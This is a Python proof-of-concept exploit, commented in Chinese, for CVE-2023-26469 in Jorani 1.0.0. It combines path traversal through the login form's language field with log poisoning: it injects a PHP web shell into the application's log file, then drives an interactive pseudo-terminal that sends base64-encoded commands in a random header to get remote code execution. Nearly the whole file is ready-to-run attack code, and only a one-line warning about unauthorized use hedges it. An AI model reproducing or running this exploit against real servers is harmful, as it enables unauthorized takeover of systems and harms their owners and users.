"""
CVE-2023-26469 利用：Jorani 1.0.0中的路径遍历与日志注入漏洞
该漏洞允许通过向日志文件注入PHP代码，并利用路径遍历访问日志文件，从而执行远程代码。
"""

import pyreadline3 as readline  # 替代readline库，适用于Windows环境
import requests
import datetime
import sys
import re
import base64
import random
import string
import platform

# 禁用SSL不安全请求的警告
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# 定义日志输出的函数
msg = lambda x, y="\n": print(f'\x1b[92m[+]\x1b[0m {x}', end=y)
err = lambda x, y="\n": print(f'\x1b[91m[x]\x1b[0m {x}', end=y)
log = lambda x, y="\n": print(f'\x1b[93m[?]\x1b[0m {x}', end=y)

# 正则表达式，用于提取CSRF令牌和命令执行结果
CSRF_PATTERN = re.compile('<input type="hidden" name="csrf_test_jorani" value="(.*?)"')
CMD_PATTERN = re.compile('---------(.*?)---------', re.S)

# URL路径映射
URLS = {
    'login': '/session/login',
    'view': '/pages/view/',
}

# 随机生成一个头字段名，以绕过某些保护机制
HEADER_NAME = ''.join(random.choice(string.ascii_uppercase) for _ in range(12))

# 用于绕过重定向保护的请求头
BypassRedirect = {
    'X-REQUESTED-WITH': 'XMLHttpRequest',
    HEADER_NAME: ""
}

# 伪终端输入的提示符样式
INPUT = "\x1b[92muser\x1b[0m@\x1b[41mjorani\x1b[0m(PSEUDO-TERM)\n$ "

# 简化URL构造的函数
u = lambda base_url, path_key: base_url + URLS[path_key]

# 注入的恶意PHP代码和路径遍历payload
POISON_PAYLOAD = f"<?php if(isset($_SERVER['HTTP_{HEADER_NAME}'])){{system(base64_decode($_SERVER['HTTP_{HEADER_NAME}']));}} ?>"
PATH_TRAV_PAYLOAD = "../../application/logs"

if __name__ == '__main__':
    print("""
    /!\\ 警告：未经授权使用此脚本是非法的 /!\\
    """)
    log("PoC 由 @jrjgjk (Guilhem RIOUX) 编写", "\n\n")

    # 检查是否提供了目标URL
    if len(sys.argv) != 2:
        err(f"用法: {sys.argv[0]} <url>")
        exit(1)

    # 显示生成的头字段名称
    log(f"用于攻击的请求头字段: {HEADER_NAME}")    
    target_url = sys.argv[1]

    # 初始化会话并获取CSRF令牌
    session = requests.Session()
    log("请求会话cookie和CSRF令牌")
    response = session.get(u(target_url, "login"), verify=False)

    # 提取CSRF令牌，未找到时输出错误并退出
    csrf_token_match = re.search(CSRF_PATTERN, response.text)
    if not csrf_token_match:
        err("无法获取CSRF令牌，请检查目标URL。")
        exit(1)
    csrf_token = csrf_token_match.group(1)
    msg(f"获取到的CSRF令牌: {csrf_token}")

    # 根据当前日期生成日志文件名
    log_file_name = f"log-{datetime.date.today().isoformat()}"
    log(f"目标日志文件名称: {log_file_name}")

    # 向日志文件中注入恶意代码
    data = {
        "csrf_test_jorani": csrf_token,
        "last_page": "session/login",
        "language": PATH_TRAV_PAYLOAD,
        "login": POISON_PAYLOAD,
        "CipheredValue": "DummyPassword"
    }
    log("向日志文件注入恶意代码...")
    session.post(u(target_url, "login"), data=data)

    # 访问日志文件页面，执行命令
    exploit_page = u(target_url, 'view') + log_file_name

    # 模拟shell，进行命令执行
    while True:
        cmd = input(INPUT)
        if cmd.lower() in ['x', 'exit', 'quit']:
            break
        elif not cmd.strip():
            continue

        # 将命令编码为Base64并发送请求
        BypassRedirect[HEADER_NAME] = base64.b64encode(f"echo ---------; {cmd} 2>&1; echo ---------;".encode()).decode()
        response = session.get(exploit_page, headers=BypassRedirect)

        # 提取并显示命令执行结果
        cmd_result = re.search(CMD_PATTERN, response.text)
        if cmd_result:
            print(cmd_result.group(1).strip())
        else:
            err("返回异常，请验证URL并重试。")
            exit(1)